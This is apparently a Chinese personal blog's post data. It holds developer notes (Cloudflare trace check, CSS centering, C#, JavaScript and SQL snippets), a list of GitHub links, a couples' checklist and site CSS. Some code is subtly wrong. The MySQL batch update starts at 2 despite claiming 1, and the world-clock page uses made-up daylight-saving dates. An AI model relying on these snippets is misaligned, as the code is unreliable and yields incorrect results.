要判断是不是套了cf要判断是不是套了cf，可以在网址后面加&#x2F;cdn-cgi&#x2F;trace 有页面就是套了cf 上面也会显示你访问用的iphttps://chat.openai.com/cdn-cgi/trace cssimg居中img标签在HTML页面中居中显示，可以采用以下几种方法： ‌一、水平居中‌‌使用text-align属性‌： 给img的父元素设置text-align: center;，这样img标签就会继承这个属性，实现水平居中的效果‌12。‌使用margin属性‌： 给img标签设置margin-left: auto;和margin-right: auto;，并添加display: block;，这样img标签就会自动计算左右两边的空间，使得它在水平方向上居中‌12。‌使用flex布局‌： 给img的父元素设置display: flex;和justify-content: center;，这样img标签就会在父元素的水平方向上居中‌12。 ‌二、垂直居中‌‌使用flex布局‌： 给包裹img的父元素设置**display: flex;和align-items: center;**，即可实现垂直居中‌45。‌使用display: table;‌： 给父元素设置display: table;，给子元素（即包裹img的容器）设置display: table-cell;和vertical-align: middle;，即可实现垂直居中‌4。‌使用绝对定位‌： 通过绝对定位的方式，结合top、left、transform等属性，也可以实现img的垂直居中，但这种方法需要更精细的布局控制‌4。根据实际需求，可以选择适合的方法来实现img标签的居中显示。 c# csharpc# email regex 正则校验12345678string pattern = @&quot;^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+$&quot;;Regex regex = new Regex(pattern);if (!regex.IsMatch(email))&#123; trsm.msg = localizer.GetString(&quot;UStatus2&quot;).Value;//s2 jsrs = JsonConvert.SerializeObject(trsm); return jsrs;&#125; jsjs world time123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Time Zones Display&lt;/title&gt; &lt;style&gt; body &#123; font-family: Arial, sans-serif; &#125; div &#123; margin-bottom: 10px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;北京时间: &lt;span id=&quot;beijingTime&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;div&gt;东京时间: &lt;span id=&quot;tokyoTime&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;div&gt;欧洲-巴黎时间: &lt;span id=&quot;parisTime&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;div&gt;英国-伦敦时间: &lt;span id=&quot;londonTime&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;div&gt;美东-纽约时间: &lt;span id=&quot;newYorkTime&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;div&gt;美西-洛杉矶时间: &lt;span id=&quot;losAngelesTime&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;div&gt;UTC时间: &lt;span id=&quot;utcTime&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;script&gt; // 定义各个时区相对UTC的偏移量（单位：小时），考虑夏令时情况设置不同偏移量范围 const timeZoneOffsets = &#123; &#x27;beijing&#x27;: 8, // 北京不实行夏令时，固定偏移8小时 &#x27;tokyo&#x27;: 9, // 东京不实行夏令时，固定偏移9小时 &#x27;paris&#x27;: [1, 2], // 巴黎实行夏令时，冬令时偏移1小时，夏令时偏移2小时（示例简化处理，实际更复杂） &#x27;london&#x27;: [0, 1], // 伦敦实行夏令时，冬令时偏移0小时，夏令时偏移1小时 &#x27;newYork&#x27;: [-5, -4], // 纽约实行夏令时，冬令时偏移-5小时，夏令时偏移-4小时 &#x27;losAngeles&#x27;: [-8, -7] // 洛杉矶实行夏令时，冬令时偏移-8小时，夏令时偏移-7小时 &#125;; function padZero(num) &#123; return num &lt; 10? &#x27;0&#x27; + num : num; &#125; function formatTime(date) &#123; const year = date.getFullYear(); const month = padZero(date.getMonth() + 1); const day = padZero(date.getDate()); const hours = padZero(date.getHours()); const minutes = padZero(date.getMinutes()); const seconds = padZero(date.getSeconds()); return `$&#123;year&#125;-$&#123;month&#125;-$&#123;day&#125; $&#123;hours&#125;:$&#123;minutes&#125;:$&#123;seconds&#125;`; &#125; function isDaylightSavingTime(date, zone) &#123; const month = date.getMonth(); const dstStart = new Date(date.getFullYear(), 3, 8, 2, 0, 0); // 假设每年4月8日凌晨2点开始夏令时（简化示例，实际不同地区规则差异大） const dstEnd = new Date(date.getFullYear(), 10, 1, 2, 0, 0); // 假设每年10月1日凌晨2点结束夏令时 if (zone === &#x27;paris&#x27; || zone === &#x27;london&#x27; || zone === &#x27;newYork&#x27; || zone === &#x27;losAngeles&#x27;) &#123; return date &gt;= dstStart &amp;&amp; date &lt; dstEnd; &#125; return false; &#125; function updateTime() &#123; const now = new Date(); const utcDate = new Date(now.getUTCFullYear(), now.getUTCMonth(), now.getUTCDate(), now.getUTCHours(), now.getUTCMinutes(), now.getUTCSeconds()); const utcTime = formatTime(utcDate); document.getElementById(&#x27;utcTime&#x27;).innerHTML = utcTime; for (const zone in timeZoneOffsets) &#123; const offsets = timeZoneOffsets[zone]; let offset; if (Array.isArray(offsets)) &#123; offset = isDaylightSavingTime(utcDate, zone)? offsets[1] : offsets[0]; &#125; else &#123; offset = offsets; &#125; const zoneDate = new Date(utcDate.getTime() + offset * 60 * 60 * 1000); document.getElementById(zone + &#x27;Time&#x27;).innerHTML = formatTime(zoneDate); &#125; setTimeout(updateTime, 1000); &#125; window.onload = function () &#123; updateTime(); &#125;; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; mssqlbackup 限制访问SQL还原DB属性 选项 状态 限制访问 SINGLE 12345USE master;GOALTER DATABASE databasenameSET SINGLE_USERWITH ROLLBACK IMMEDIATE; backup 123ALTER DATABASE databasenameSET MULTI_USER;GO MULTI_USER mysqlNOW() 和 CURRENT_DATE() 的区别 NOW() 和 CURRENT_DATE() 的区别1 返回值类型不同：NOW() 返回的是 DATETIME 类型，包含日期和时间（精确到秒）。CURRENT_DATE() 返回的是 DATE 类型，仅包含日期部分，不包含时间。2 精度不同：NOW() 的精度更高，适合用于需要精确时间戳的场合。CURRENT_DATE() 只提供日期精度，适合在仅关注日期的场景下使用。3 使用场景不同：在需要完整时间戳的场合（如日志记录、事件跟踪、时间差计算），NOW() 是更好的选择。在仅需关注日期的场合（如生日、发布日期、账单日期），CURRENT_DATE() 更加合适。4 时间计算差异：使用 NOW() 可以直接进行时间差计算，因为它包含了时间部分。使用 CURRENT_DATE() 进行时间计算时，比较的只是日期部分，因此在计算时不考虑具体时间。 mysql 修改 累增 iuser表 UserEMail 为&#x31;&#x40;&#113;&#113;&#46;&#x63;&#111;&#109; 累增 如&#50;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#109; &#51;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#109; &#52;&#x40;&#113;&#x71;&#x2e;&#x63;&#111;&#109; 有多少用户则该多少个。批量修改 UserEMail 怎么写mysql在 MySQL 中，你可以使用变量结合UPDATE语句来实现这个批量修改UserEMail字段值的需求。假设表名为iuser，示例代码如下：sql– 设置初始值为1SET @num :&#x3D; 1;– 更新表中的数据UPDATE iuserSET UserEMail &#x3D; CONCAT(@num :&#x3D; @num + 1, ‘@qq.com’);代码解释：SET @num :&#x3D; 1;：定义了一个用户变量@num，并初始化为1。UPDATE iuser SET UserEMail &#x3D; CONCAT(@num :&#x3D; @num + 1, ‘@qq.com’);：在更新语句中，使用CONCAT函数把变量@num不断自增的值与‘@qq.com’拼接起来，再赋值给UserEMail字段。每次更新时，@num变量都会自动加 1，从而达成依次生成&#x31;&#x40;&#x71;&#x71;&#46;&#99;&#111;&#x6d;、&#50;&#64;&#x71;&#113;&#x2e;&#99;&#x6f;&#109; 等邮箱地址的效果。 something gitChatGPT&#x2F;GeminiA cross-platform ChatGPT&#x2F;Gemini UI (Web &#x2F; PWA &#x2F; Linux &#x2F; Win &#x2F; MacOS). 一键拥有你自己的跨平台 ChatGPT&#x2F;Gemini 应用https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web ScreenToGifallows you to record a selected area of your screen, edit and save it as a gif or video.https://github.com/NickeManarin/ScreenToGif awesome-dotnetA collection of awesome .NET core libraries, tools, frameworks and softwarehttps://github.com/thangchung/awesome-dotnet-core DotNetGuide面向.NET开发者的开源技术社区https://github.com/YSGStudyHards/DotNetGuide isply 反编译 dll exehttps://github.com/isply WinSCPa popular free SFTP and FTP client for Windowshttps://github.com/winscp/winscp mediasoupCutting Edge WebRTC Video Conferencinghttps://github.com/versatica/mediasoup-demo protobuf-netProtocol Buffers library for idiomatic .NEThttps://github.com/protobuf-net/protobuf-net DotNettySocket An Easy Socket(TcpSocket,WebSocket,UdpSocket) Framework Based On DotNettyhttps://github.com/Coldairarrow/DotNettySocket YOLO11基于深度学习和计算机视觉领域的尖端技术https://docs.ultralytics.com/https://github.com/ultralytics/ultralyticshttps://github.com/angery/yolov11demo .NET CORE 代码生成器Web中使用CodeFirst模式， 实体 生成器，UI代码 生成器，在线建表，PostgresSql生成器，达梦生成器，金仓生成器MySql生成器，SQLServere生成器、Oracle生成器、Sqlite生成器、导出文档，模版配置， WEB代码生成器 ，API代码生成器https://github.com/DotNetNext/WebFirst 开源notehttps://gitee.com/cxasm/notepad-- 大屏数据https://gitee.com/lvyeyou/DaShuJuZhiDaPingZhanShi hello-cangjiehttps://github.com/open-cangjie/hello-cangjie nginx-uihttps://github.com/0xJacky/nginx-ui weeklyhttps://github.com/Geekhyt/weeklyhttps://github.com/ruanyf/weeklyhttps://github.com/ljinkai/weekly Kscango开发的全方位扫描器，https://github.com/lcvvvv/kscan python3源码12306抢票，excel操作，json操作，request操作，zip操作，下班倒计时，从零学Python-掘金活动，图灵机器人聊天，处理Excel数据原表保存，处理Excel表格数据，微信点赞刷票，恶搞钓鱼网站，抓取IP地址，拼接表格单行数据为字符串，爬取Boss直聘数据，王者荣耀皮肤爬图，百思图片视频，省市区三级地址json-mysql，省市区三级地址库，省市区乡村五级地址库，省市区镇四级地址库，自动生成数据库表字典的markdown文本，自动登陆邮箱，英雄联盟皮肤爬图，贴吧-内涵段子，跳板机连接mysql，远程服务器下载文件https://github.com/gxcuizy/Python Awesome LLMs In China中文大模型https://github.com/wgwang/awesome-LLMs-In-China Deep-Live-CamReal-time face swap and video deepfake with a single click and only a single image.https://github.com/hacksider/Deep-Live-Cam awesome-avaloniaA collection of interesting libraries and tools for Avalonia project.https://github.com/AvaloniaCommunity/awesome-avalonia Machine Learning for allhttps://github.com/microsoft/ML-For-Beginners SunnyUI.NET基于.NET Framework 4.0+、.NET6、.NET8、.NET9 框架的 C# WinForm UI、开源控件库、工具类库、扩展类库、多页面开发框架。https://gitee.com/yhuse/SunnyUI flutter-chatbothttps://github.com/fanenr/flutter-chatbot immobile https://github.com/DWHengr/linyu_mobilepc https://github.com/DWHengr/linyu-clientserver https://github.com/DWHengr/linyu-server lazy-captcha .NET验证码https://gitee.com/pojianbing/lazy-captcha 隐写 jpg png add text filehttps://github.com/kingthy/imagemask somelinkgoogle翻译文档https://translate.google.com/?hl=zh-cn&amp;sl=zh-CN&amp;tl=zh-TW&amp;op=docs somegame红警2共和国https://modelgood.com/5944.html 红警2对战https://www.ra2ol.com/ 11gamehttps://war3.5211game.com/ kkhttps://www.kkdzpt.com/ uphttps://patch.ali213.net/showpatch/209293.html ecs测试脚本 shhttps://github.com/spiritLHLS/ecs u盘启动小米笔记本 F12&#x2F;del微星笔记本 F8","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"100件小事","slug":"T100","date":"2023-02-20T02:27:36.000Z","updated":"2024-07-27T15:56:28.000Z","comments":true,"path":"2023/02/20/T100/","permalink":"https://banjinmei.github.io/2023/02/20/T100/","excerpt":"","text":"手牵手逛街 一起看海 一起看雪 喂我吃东西 一起堆雪人 一起坐摩天轮 一起恶作剧 一起坐海盗船 吃同一杯冰淇淋 一起搬东西 一起布置我们的小窝 一起看日出 一起看恐怖片 送惊喜小礼物 为我做顿饭 一起看爱情片 一起看日落 一起数星星 一起洗衣服 一起听同一首曲子 在朋友面前介绍我 把肩膀借给我靠 为我擦眼泪 唱歌给我听 为我写篇日记 在大街上背我 随叫随到 一起看球赛 比赛啃西瓜 在沙滩上画心 一起没形象的大叫 一起熬夜玩游戏 为我系鞋带 一起拉粑 一起发呆 一起过我们的纪念日 一起做陶瓷 一起许愿 一起做蛋糕 学对方说话 一起模仿搞笑的事情 为我剪指甲 吃我剩下的饭饭 把你欺负的对我没辙 一起打水仗 一起拍照片 一起骑脚踏车 戴同一条围巾 戴同一双手套 讲故事哄我睡觉 一起吃棉花糖 一起唱歌 一起淋雨 一起面对所有难堪 一起爬山 一起露营 一起跑步 一起傻笑 一起吃路边摊 一起去猫咖 穿情侣装显摆 一起打羽毛球 一起吃爱吃的东西到吐 一起踩马路到脚软 一起去旅行 一起去动物园 咬一下你的脸颊 对我说晚安 一起看电影 一起买菜 比赛石头剪刀布 一起见对方的朋友 一起做鬼脸 一起走遍世界各地 一起吃大餐，牵手进去，扶墙出来 一起扎气球赢奖品 站在马路的两侧大喊 看你打场比赛 一起看演唱会 一起沿铁轨 一起坐地铁 一起放风筝 一起看花田 趁你睡觉偷亲你一下 一起放孔明灯 一起钓鱼 一起下棋 一起在烈日下暴晒 手机屏保设置对方的照片 一起敷面膜 一起捏对方的脸 打赌各种各样的事 一起看烟火 在树下埋下我们的约定 去海边放漂流瓶 拍一次婚纱照 求婚 结婚 完成人生各项大事 白头偕老 @charset \"UTF-8\";a,abbr,address,article,aside,audio,b,blockquote,body,canvas,cite,code,dd,del,details,dfn,div,dl,dt,em,embed,fieldset,figcaption,figure,footer,form,h1,h2,h3,h4,h5,h6,header,hgroup,html,i,iframe,img,kbd,label,li,mark,nav,object,ol,output,p,pre,q,ruby,s,samp,section,small,span,strong,sub,summary,sup,table,tbody,td,tfoot,th,thead,time,tr,u,ul,var,video { margin: 0; padding: 0; border: 0; vertical-align: baseline; font: inherit; font-size: 100% } .float_btns {display:none} .sidebar {display:none} body { line-height: 1; -webkit-text-size-adjust: none; -ms-overflow-style: scrollbar } article,aside,details,figcaption,figure,footer,header,hgroup,nav,section { display: block } button,input,select,textarea { resize: none } ol,ul { list-style: none } blockquote,q { quotes: none } blockquote:after,blockquote:before,q:after,q:before { content: ''; content: none } table { border-collapse: collapse; border-spacing: 0 } *,:after,:before { -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box } body { background: #FFF } html { overflow-x: hidden; -ms-text-size-adjust: 100%; -webkit-text-size-adjust: 100% } ::-moz-selection { background-color: #EEE; color: #000 } ::selection { background-color: #EEE; color: #000 } body,input,select,textarea { color: #444; font-weight: 400; font-size: .875rem; font-family: -apple-system,BlinkMacSystemFont,Avenir,\"Avenir Next\",\"Segoe UI\",Roboto,Oxygen,Ubuntu,Cantarell,\"Fira Sans\",\"Droid Sans\",\"Helvetica Neue\",sans-serif; line-height: 1.65; text-rendering: geometricPrecision; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale } a { color: #f15bb5; text-decoration: none } a:hover { color: #f15bb5 } blockquote,dl,ol,p,pre,table,ul { margin: 10px 0 } blockquote,dl,form,ol,p,pre,ul { letter-spacing: 1px } b,strong { color: #555; font-weight: 700 } em,i { font-style: italic } h1,h2,h3,h4,h5,h6 { margin-top: 0; margin-bottom: .25em; color: inherit; font-weight: 500 } h1 { font-size: 2rem } h2 { font-size: 1.6rem } h3 { font-size: 1.4rem } h4 { font-size: 1.2rem } h5 { font-size: 1rem } h6 { font-size: .8rem } sub { position: relative; top: .5em; font-size: .8em } sup { position: relative; top: -.5em; font-size: .8em } blockquote { padding: 0 15px; border-left: solid 4px #ddd } code { margin: .5em .5em; padding: .25em .65em; border: solid 1px rgba(144,144,144,.25); border-radius: 4px; background: rgba(144,144,144,.075); font-size: .9em } pre { font-size: .9em; -webkit-overflow-scrolling: touch } pre code { display: block; overflow-x: auto; padding: 1em 1.5em; line-height: 1.75 } ol { padding-left: 1.25em; list-style: decimal } ol li { padding-left: .25em } ul { padding-left: 1em; list-style: disc } ul li { padding-left: .5em } dl dt { display: block; margin: 0 0 1em 0; font-weight: 700 } dl dd { margin-left: 2em } hr { margin: 1em 0; border: 0; border-bottom: solid 1px rgba(144,144,144,.25) } hr.major { margin: 3em 0 } label { display: block; margin: 0 0 1em 0; color: #555; font-weight: 700; font-size: .9em } table { overflow: auto; width: 100%; border-collapse: collapse; word-wrap: normal; font-size: 12px; border-spacing: 0; word-break: normal } table tbody,table thead { background: #f8f8f8 } table td,table th { padding: 6px 13px; border: 1px solid #ddd } table th { font-weight: 700 } table tbody tr:hover { background: #efefef } mark { padding: .05rem; border-radius: .1rem; background: #b9e5ff; color: #555 } ::-webkit-input-placeholder { color: #bbb!important; opacity: 1 } :-moz-placeholder { color: #bbb!important; opacity: 1 } ::-moz-placeholder { color: #bbb!important; opacity: 1 } :-ms-input-placeholder { color: #bbb!important; opacity: 1 } .button,button,input[type=button],input[type=email],input[type=password],input[type=reset],input[type=submit],input[type=tel],input[type=text],select,textarea { outline: 0; border: 0; border-radius: 4px; text-decoration: none; -moz-appearance: none; -webkit-appearance: none; -ms-appearance: none; appearance: none } input[type=email],input[type=password],input[type=tel],input[type=text],select,textarea { display: block; padding: 0 1em; width: 100%; border: solid 1px rgba(144,144,144,.25); background: rgba(144,144,144,.075); color: inherit } input[type=email],input[type=password],input[type=text],select { height: 2.75em } textarea { padding: .75em 1em } .select-wrapper { position: relative; display: block; text-decoration: none } .select-wrapper:before { content: \"\\e815\"; text-transform: none!important; font-weight: 400; font-style: normal; font-family: fontello; -moz-osx-font-smoothing: grayscale; -webkit-font-smoothing: antialiased } .select-wrapper:before { position: absolute; top: 0; right: 0; display: block; width: 2.75em; height: 2.75em; color: rgba(144,144,144,.25); text-align: center; line-height: 2.75em; pointer-events: none } .select-wrapper select::-ms-expand { display: none } input[type=checkbox],input[type=radio] { z-index: -1; float: left; display: block; margin-right: -2em; width: 1em; opacity: 0; -moz-appearance: none; -webkit-appearance: none; -ms-appearance: none; appearance: none } input[type=checkbox]+label,input[type=radio]+label { position: relative; display: inline-block; padding-right: .75em; padding-left: 2.4em; color: #444; text-decoration: none; font-weight: 400; font-size: 1em; cursor: pointer } input[type=checkbox]+label:before,input[type=radio]+label:before { text-transform: none!important; font-weight: 400; font-style: normal; font-family: fontello; -moz-osx-font-smoothing: grayscale; -webkit-font-smoothing: antialiased } input[type=checkbox]+label:before,input[type=radio]+label:before { position: absolute; top: 0; left: 0; display: inline-block; width: 1.65em; height: 1.65em; border: solid 1px rgba(144,144,144,.25); border-radius: 4px; background: rgba(144,144,144,.075); content: ''; text-align: center; line-height: 1.58125em } input[type=checkbox]:checked+label:before,input[type=radio]:checked+label:before { border-color: #5a5a5a; background: #5a5a5a; color: #fff; content: '\\2713' } input[type=checkbox]+label:before { border-radius: 4px } input[type=radio]+label:before { border-radius: 100% } select { padding-right: 1.1rem; background: rgba(144,144,144,.075) url(\"data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 4 5'%3E%3Cpath fill='%23667189' d='M2 0L0 2h4zm0 5L0 3h4z'/%3E%3C/svg%3E\") no-repeat right .35rem center/.4rem .5rem } select::-ms-expand { display: none } select[multiple] { height: auto } .button,button,input[type=button],input[type=reset],input[type=submit] { display: inline-block; padding: 0 1.5em; height: 2.85em; background-color: #5a5a5a; color: #fff!important; text-align: center; white-space: nowrap; letter-spacing: 2px; line-height: 2.95em; cursor: pointer; -webkit-transition: background-color .2s ease-in-out,color .2s ease-in-out; -moz-transition: background-color .2s ease-in-out,color .2s ease-in-out; transition: background-color .2s ease-in-out,color .2s ease-in-out; -ms-transition: background-color .2s ease-in-out,color .2s ease-in-out } .button,button:hover,input[type=button]:hover,input[type=reset]:hover,input[type=submit]:hover { background-color: #676767 } .button,button:active,input[type=button]:active,input[type=reset]:active,input[type=submit]:active { background-color: #4d4d4d } .button.alt,button.alt,input[type=button].alt,input[type=reset].alt,input[type=submit].alt { background-color: transparent; box-shadow: inset 0 0 0 2px rgba(144,144,144,.25); color: #555!important } .button.alt:hover,button.alt:hover,input[type=button].alt:hover,input[type=reset].alt:hover,input[type=submit].alt:hover { background-color: rgba(144,144,144,.075) } .button.alt:active,button.alt:active,input[type=button].alt:active,input[type=reset].alt:active,input[type=submit].alt:active { background-color: rgba(144,144,144,.2) } .button.disabled,.button:disabled,button.disabled,button:disabled,input[type=button].disabled,input[type=button]:disabled,input[type=reset].disabled,input[type=reset]:disabled,input[type=submit].disabled,input[type=submit]:disabled { background-color: #444!important; box-shadow: inset 0 -.15em 0 0 rgba(0,0,0,.15); color: #fff!important; opacity: .25; cursor: not-allowed } .container { margin-right: auto; margin-left: auto; padding-right: .4rem; padding-left: .4rem; width: 100% } .container.grid-xl { max-width: 1296px } .container.grid-lg { max-width: 976px } .container.grid-md { max-width: 856px } .container.grid-sm { max-width: 680px } .container.grid-xs { max-width: 496px } .show-lg,.show-md,.show-sm,.show-xl,.show-xs { display: none!important } .columns { display: flex; display: -ms-flexbox; margin-right: -.4rem; margin-left: -.4rem; -ms-flex-wrap: wrap; flex-wrap: wrap } .columns.col-gapless { margin-right: 0; margin-left: 0 } .columns.col-gapless>.column { padding-right: 0; padding-left: 0 } .columns.col-oneline { overflow-x: auto; -ms-flex-wrap: nowrap; flex-wrap: nowrap } .column { padding-right: .4rem; padding-left: .4rem; max-width: 100%; -ms-flex: 1; flex: 1 } .column.col-1,.column.col-10,.column.col-11,.column.col-12,.column.col-2,.column.col-3,.column.col-4,.column.col-5,.column.col-6,.column.col-7,.column.col-8,.column.col-9 { -ms-flex: none; flex: none } .s-content .column { padding: .5rem } .col-12 { width: 100% } .col-11 { width: 91.66666667% } .col-10 { width: 83.33333333% } .col-9 { width: 75% } .col-8 { width: 66.66666667% } .col-7 { width: 58.33333333% } .col-6 { width: 50% } .col-5 { width: 41.66666667% } .col-4 { width: 33.33333333% } .col-3 { width: 25% } .col-2 { width: 16.66666667% } .col-1 { width: 8.33333333% } .col-auto { width: auto; max-width: none; -ms-flex: 0 0 auto; flex: 0 0 auto } .col-mx-auto { margin-right: auto; margin-left: auto } .col-ml-auto { margin-left: auto } .col-mr-auto { margin-right: auto } @media (max-width: 1280px) { .col-xl-1,.col-xl-10,.col-xl-11,.col-xl-12,.col-xl-2,.col-xl-3,.col-xl-4,.col-xl-5,.col-xl-6,.col-xl-7,.col-xl-8,.col-xl-9 { -ms-flex:none; flex: none } .col-xl-12 { width: 100% } .col-xl-11 { width: 91.66666667% } .col-xl-10 { width: 83.33333333% } .col-xl-9 { width: 75% } .col-xl-8 { width: 66.66666667% } .col-xl-7 { width: 58.33333333% } .col-xl-6 { width: 50% } .col-xl-5 { width: 41.66666667% } .col-xl-4 { width: 33.33333333% } .col-xl-3 { width: 25% } .col-xl-2 { width: 16.66666667% } .col-xl-1 { width: 8.33333333% } .hide-xl { display: none!important } .show-xl { display: block!important } } @media (max-width: 960px) { .col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9 { -ms-flex:none; flex: none } .col-lg-12 { width: 100% } .col-lg-11 { width: 91.66666667% } .col-lg-10 { width: 83.33333333% } .col-lg-9 { width: 75% } .col-lg-8 { width: 66.66666667% } .col-lg-7 { width: 58.33333333% } .col-lg-6 { width: 50% } .col-lg-5 { width: 41.66666667% } .col-lg-4 { width: 33.33333333% } .col-lg-3 { width: 25% } .col-lg-2 { width: 16.66666667% } .col-lg-1 { width: 8.33333333% } .hide-lg { display: none!important } .show-lg { display: block!important } } @media (max-width: 840px) { .col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9 { -ms-flex:none; flex: none } .col-md-12 { width: 100% } .col-md-11 { width: 91.66666667% } .col-md-10 { width: 83.33333333% } .col-md-9 { width: 75% } .col-md-8 { width: 66.66666667% } .col-md-7 { width: 58.33333333% } .col-md-6 { width: 50% } .col-md-5 { width: 41.66666667% } .col-md-4 { width: 33.33333333% } .col-md-3 { width: 25% } .col-md-2 { width: 16.66666667% } .col-md-1 { width: 8.33333333% } .hide-md { display: none!important } .show-md { display: block!important } } @media (max-width: 600px) { .col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9 { -ms-flex:none; flex: none } .col-sm-12 { width: 100% } .col-sm-11 { width: 91.66666667% } .col-sm-10 { width: 83.33333333% } .col-sm-9 { width: 75% } .col-sm-8 { width: 66.66666667% } .col-sm-7 { width: 58.33333333% } .col-sm-6 { width: 50% } .col-sm-5 { width: 41.66666667% } .col-sm-4 { width: 33.33333333% } .col-sm-3 { width: 25% } .col-sm-2 { width: 16.66666667% } .col-sm-1 { width: 8.33333333% } .hide-sm { display: none!important } .show-sm { display: block!important } } @media (max-width: 480px) { .col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9 { -ms-flex:none; flex: none } .col-xs-12 { width: 100% } .col-xs-11 { width: 91.66666667% } .col-xs-10 { width: 83.33333333% } .col-xs-9 { width: 75% } .col-xs-8 { width: 66.66666667% } .col-xs-7 { width: 58.33333333% } .col-xs-6 { width: 50% } .col-xs-5 { width: 41.66666667% } .col-xs-4 { width: 33.33333333% } .col-xs-3 { width: 25% } .col-xs-2 { width: 16.66666667% } .col-xs-1 { width: 8.33333333% } .hide-xs { display: none!important } .show-xs { display: block!important } } .horizontal-align { display: flex; justify-content: center } .header { padding: 50px 0 0 } .header .column { padding: 0 } .logo { display: inline-block; margin: 0 20px 0 10px; vertical-align: middle; font-size: 72px } .logo .i-love { position: relative; top: -6px; width: 69px; height: 69px; background: url(img/love.png) no-repeat 0 0; vertical-align: middle } .ico { display: inline-block; width: 16px; height: 16px; vertical-align: middle } .logo a { color: #383838; font-weight: 700 } .description { display: inline-block; vertical-align: middle; letter-spacing: normal; font-size: 14px } .description a { border-bottom: 1px solid #f15bb5 } .posts { padding: 0 } .posts ol { margin-left: -30px; padding-left: 30px } .posts li { padding: 10px; border-top: 1px solid #e5e5e5 } .posts li p { margin: 0 } .posts li:hover { background: #f4f4f4 } .footer { color: #999; font-size: 12px } .footer p:first-child { margin-top: 0; padding-top: 1rem; border-top: 1px solid #e6e6e6 } .footer .column { padding-right: 0; padding-left: 0 } .comments .column { padding: 0 } .comment-form input { padding: 0 40px 0 18px; width: 100%; height: 2.75em; outline: 0; border: 1px solid rgba(184,197,214,.2); background-color: #fff; -webkit-box-shadow: 0 1px 4px rgba(0,0,0,.1); box-shadow: 0 1px 4px rgba(0,0,0,.1); -webkit-appearance: none } .comment-form textarea { outline: 0; border: 1px solid rgba(184,197,214,.2); background-color: #fff; -webkit-box-shadow: 0 1px 4px rgba(0,0,0,.1); box-shadow: 0 1px 4px rgba(0,0,0,.1); -webkit-appearance: none } .comment-form button { margin-top: 16px; background-color: #f36; color: #fff!important } .comment-hr { margin: 20px 0; border-top: 2px solid #f15bb5 } .comment-list { margin: 0; padding: 0; list-style-type: none } .comment-header { font-size: 12px } .comment-author { color: #f15bb5 } .comment-content { margin-left: 60px; border-radius: 5px; color: #999; font-size: 12px } .comment-content p { margin: 0 } .arrow { position: absolute; top: 4px; left: -5px; display: inline-block; overflow: hidden; width: 0; height: 0; border-width: 4px 4px 4px 0; font: 0/0 arial; border-right-color: #dcdcdc } .larr-in { left: -4px; border-right-color: #f8faff } .larr,.larr-in { border-right-style: solid!important } .larr,.larr-in { border-top-color: transparent!important; border-bottom-color: transparent!important; border-top-style: dashed!important; border-bottom-style: dashed!important } .comment-header .avatar { float: left; display: inline-block; width: 50px; height: 50px; border: 1px solid #eaeaea; border-radius: 50% } .comment-reply { float: right } #cancel-comment-reply-link { margin-left: 16px } .comment-view { padding: 4px 0; min-height: 60px; border-bottom: 1px dotted #e5e5e5 } .comment-child { padding-left: 60px } .lists-navigator { margin: 20px 0 } .lists-navigator ol { padding: 0 10px; list-style: none; text-align: center } .lists-navigator ol li { display: inline-block; color: #999 } .lists-navigator ol li a { padding: 0 5px; color: #999 } .lists-navigator ol li.current a { color: #f15bb5 } .done { color: #999; font-style: italic } .comment-author-approve { padding: .1rem .25rem; border-radius: .25rem; background-color: #f36; color: #FFF } .top { float: right } .comment-author-at { float: left; margin-right: 5px } .links { border-top: 1px solid #e6e6e6 } .links ul { overflow: hidden; margin: 0; padding: 0; margin-top: 16px; list-style: none } .links ul li { position: relative; float: left; width: 50%; border-radius: 5px; list-style: none } .links ul li:hover { background: rgba(155,155,155,.1) } .links ul li a { display: block; padding: 0 10px 0 90px; height: 90px; color: #444 } .links ul li a img { position: absolute; top: 15px; left: 15px; margin: 0; width: 60px; height: 60px; border-radius: 50%; cursor: pointer } .links ul li a h4 { padding-top: 20px; font-size: 13px } .links ul li a p { font-size: 12px } .links ul li a h4,.links ul li a p { overflow: hidden; text-overflow: ellipsis; white-space: nowrap } @media (max-width: 720px) { .header .column { padding:.5rem } .posts ol { margin-left: 0; padding: 0 40px } .comments .column { padding: 0 15px } .footer .column { padding: .5rem 15px } .links ul li { width: 100% } } @media (max-width: 636px) { .header { padding:0 } .header .column { text-align: center } 